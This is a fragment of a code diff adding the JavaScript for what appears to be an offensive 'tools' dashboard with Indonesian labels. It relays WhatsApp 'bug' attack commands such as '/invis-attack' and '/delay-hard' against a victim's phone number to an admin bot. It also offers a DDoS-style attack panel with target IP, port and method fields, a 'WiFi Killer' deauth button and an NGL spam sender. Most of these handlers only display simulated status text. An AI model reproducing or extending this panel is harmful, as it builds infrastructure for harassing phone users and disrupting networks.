+                    commandMessage = `/invis-attack ${cleanNumber}`;
+                } else if (bug === 'DELAY_INVISIBLE') {
+                    commandMessage = `/delay-invisible ${cleanNumber}`;
+                } else if (bug === 'DELAY_HARD') {
+                    commandMessage = `/delay-hard ${cleanNumber}`;
+                }
+                sendWhatsAppMessage(TARGET_NUMBER, commandMessage);
+                showToast(`✅ Perintah dikirim ke admin bot untuk ${num}`, true);
+            }
+        });
+    }
+    
+    // Tools functions
+    const modalDynamic = document.getElementById('dynamicModal');
+    const modalContentDiv = document.getElementById('modalContent');
+    function closeDynamicModal() { modalDynamic.classList.remove('show'); }
+    function showDynamicModal(html) {
+        modalContentDiv.innerHTML = html;
+        modalDynamic.classList.add('show');
+        const closeBtn = modalContentDiv.querySelector('.close-modal-btn');
+        if(closeBtn) closeBtn.onclick = closeDynamicModal;
+    }
+    
+    function showAttackPanel() { showDynamicModal(`<div class="modal-header"><h3>Attack Panel</h3></div><div class="modal-body"><label>TARGET IP</label><input id="targetIp" value="192.168.1.1"><label>PORT</label><input id="targetPort" value="80"><label>DURATION</label><input id="attackDuration" value="60"><label>METHOD</label><input id="attackMethod" value="TCP"><button id="launchAttackBtn">LAUNCH ATTACK</button><button class="close-modal-btn">CLOSE</button><div class="status-log" id="attackStatus">Ready.</div></div>`);
+        document.getElementById('launchAttackBtn')?.addEventListener('click',()=>{ document.getElementById('attackStatus').innerHTML = `[ATTACK] simulated`; }); }
+    function showVpsList() { showDynamicModal(`<div class="modal-header"><h3>My VPS List</h3></div><div class="modal-body"><div>No VPS</div><button class="close-modal-btn">CLOSE</button></div>`); }
+    function showWifiKiller() { showDynamicModal(`<div class="modal-header"><h3>WiFi Killer</h3></div><div class="modal-body"><button id="startWifi">START</button><button class="close-modal-btn">CLOSE</button><div class="status-log" id="wifiStatus">Ready</div></div>`);
+        document.getElementById('startWifi')?.addEventListener('click',()=>{ document.getElementById('wifiStatus').innerHTML = "[KILL] Deauth sent"; }); }
+    function showNglSender() { showDynamicModal(`<div class="modal-header"><h3>NGL Sender</h3></div><div class="modal-body"><input id="nglUser" placeholder="username"><textarea id="nglMsg" placeholder="pesan"></textarea><button id="startNgl">START</button><button class="close-modal-btn">CLOSE</button><div class="status-log" id="nglStatus">Ready</div></div>`);
+        let interval; document.getElementById('startNgl')?.addEventListener('click',()=>{ if(interval) clearInterval(interval); interval = setInterval(()=>{ document.getElementById('nglStatus').innerHTML = "[SENT] spam"; },2000); }); }
+    function showDomainOsint() { showDynamicModal(`<div class="modal-header"><h3>Domain OSINT</h3></div><div class="modal-body"><input id="domainInput" placeholder="example.com"><button id="cekDomain">CEK</button><button class="close-modal-btn">CLOSE</button><div class="status-log" id="domainResult">Hasil</div></div>`);
+        document.getElementById('cekDomain')?.addEventListener('click',()=>{ document.getElementById('domainResult').innerHTML = "[OSINT] Whois lookup simulated"; }); }
+    function showInstagramDl() { showDynamicModal(`<div class="modal-header"><h3>Instagram Downloader</h3></div><div class="modal-body"><input id="igUrl" placeholder="URL"><button id="dlIg">DOWNLOAD</button><button class="close-modal-btn">CLOSE</button><div class="status-log">Ready</div></div>`); }
+    function showTiktokDl() { showDynamicModal(`<div class="modal-header"><h3>TikTok Downloader</h3></div><div class="modal-body"><input id="ttUrl" placeholder="URL"><button id="dlTt">DOWNLOAD</button><button class="close-modal-btn">CLOSE</button><div class="status-log">Ready</div></div>`); }
+    function showQrGenerator() { showDynamicModal(`<div class="modal-header"><h3>QR Generator</h3></div><div class="modal-body"><input id="qrText" placeholder="text"><button id="genQr">GENERATE</button><div id="qrResult" style="text-align:center;margin-top:12px;"></div><button class="close-modal-btn">CLOSE</button></div>`);
+        document.getElementById('genQr')?.addEventListener('click',()=>{ const val=document.getElementById('qrText').value; document.getElementById('qrResult').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(val)}">`; }); }
+    
+    const featureMap = { 'attack-panel': showAttackPanel, 'vps-list': showVpsList, 'wifi-killer': showWifiKiller, 'ngl-sender': showNglSender, 'domain-osint': showDomainOsint, 'instagram-dl': showInstagramDl, 'tiktok-dl': showTiktokDl, 'qr-generator': showQrGenerator };
+    document.querySelectorAll('.sub-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const feature = btn.getAttribute('data-feature');
+            if(feature && featureMap[feature]) featureMap[feature]();
+            else showToast('Coming soon');
+        });
+    });
+    
+    document.querySelectorAll('.main-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const target = document.getElementById(btn.getAttribute('data-target'));
+            const arrow = btn.querySelector('.arrow');
+            if(target.classList.contains('show')) {
+                target.classList.remove('show');
+                arrow.classList.remove('open');
+            } else {
+                document.querySelectorAll('.submenu').forEach(s => s.classList.remove('show'));
+                document.querySelectorAll('.arrow').forEach(a => a.classList.remove('open'));
+                target.classList.add('show');
+                arrow.classList.add('open');
+            }
+        });
+    });
+    
+    const triggerQuick = document.getElementById('triggerQuickBtn');
+    const quickSection = document.getElementById('quickSection');
+    triggerQuick.onclick = () => { quickSection.classList.toggle('show'); };
+    
+    setInterval(refreshIcons, 200);
+})();
+</script>
+</body>
+</html>
